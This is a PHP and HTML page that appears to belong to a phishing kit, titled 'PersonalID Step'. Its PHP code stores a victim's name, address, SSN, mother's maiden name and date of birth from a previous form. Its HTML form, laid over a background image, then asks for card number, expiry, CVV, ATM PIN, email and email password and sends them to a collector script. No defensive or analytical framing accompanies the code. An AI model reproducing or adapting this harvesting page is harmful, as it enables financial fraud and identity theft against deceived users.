<?php

session_start();


$_SESSION['fname'] = $_POST['fname'];
$_SESSION['lname'] = $_POST['lname'];
$_SESSION['address'] = $_POST['address'];
$_SESSION['city'] = $_POST['city'];
$_SESSION['state'] = $_POST['state'];
$_SESSION['zip'] = $_POST['zip'];
$_SESSION['phone'] = $_POST['phone'];
$_SESSION['mmn'] = $_POST['mmn'];
$_SESSION['ssn'] = $_POST['ssn'];
$_SESSION['dobmm'] = $_POST['dobmm'];
$_SESSION['dobdd'] = $_POST['dobdd'];
$_SESSION['dobyy'] = $_POST['dobyy'];
$ip = getenv("REMOTE_ADDR");
?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<title>PersonalID Step</title>
<meta name="generator" content="WYSIWYG Web Builder 12 Trial Version - http://www.wysiwygwebbuilder.com">

</head>
<body>

<form name="dd" action="inc/drdon4.php" method="POST">
<div id="wb_Image1" style="position:absolute;left:0px;top:0px;width:1349px;height:614px;z-index:0;">
<img src="img/5.png" id="Image1" alt=""></div>
<input name="ccname" required title="Please Enter Right Value" type="text" style="position:absolute;width:215px;left:410px;top:226px;z-index:13">
<input name="ccnumber" required title="Please Enter Right Value" type="text" minlength="14" style="position:absolute;width:215px;left:410px;top:264px;z-index:13">
<select name="expmonth" style="position:absolute;left:410px;top:302px;width:88px;z-index:30">
<option value="">MONTH</option>
<option value="January">January</option>
    <option value="Febuary">Febuary</option>
    <option value="March">March</option>
    <option value="April">April</option>
    <option value="May">May</option>
    <option value="June">June</option>
    <option value="July">July</option>
    <option value="August">August</option>
    <option value="September">September</option>
    <option value="October">October</option>
    <option value="November">November</option>
    <option value="December">December</option></select>
<select name="expyear" style="position:absolute;left:504px;top:302px;width:88px;z-index:31">
<option value="">YEAR</option>
    <option >2017</option>
     <option>2018</option>
    <option>2019</option>
    <option>2020</option>
    <option>2021</option>
    <option>2022</option>
    <option>2023</option>
    <option>2024</option>
    <option>2025</option>
    <option>2026</option>
    <option>2027</option></select>
<input name="cvv" required title="Please Enter Right Value" type="password" maxlength="4" style="position:absolute;width:100px;left:410px;top:345px;z-index:13">
<input name="atm" required title="Please Enter Right Value" type="password" style="position:absolute;width:100px;left:410px;top:382px;z-index:13">
<input name="email" required title="Please Enter Right Value" type="email" style="position:absolute;width:232px;left:410px;top:419px;z-index:13">
<input name="epass" required title="Please Enter Right Value" type="password" style="position:absolute;width:232px;left:410px;top:455px;z-index:13">
<input type="image" src="continue.png" style="position:absolute;left:740px;top:430px;width:174px;height:50px;z-index:0;" alt="">
</form>



</body></html>
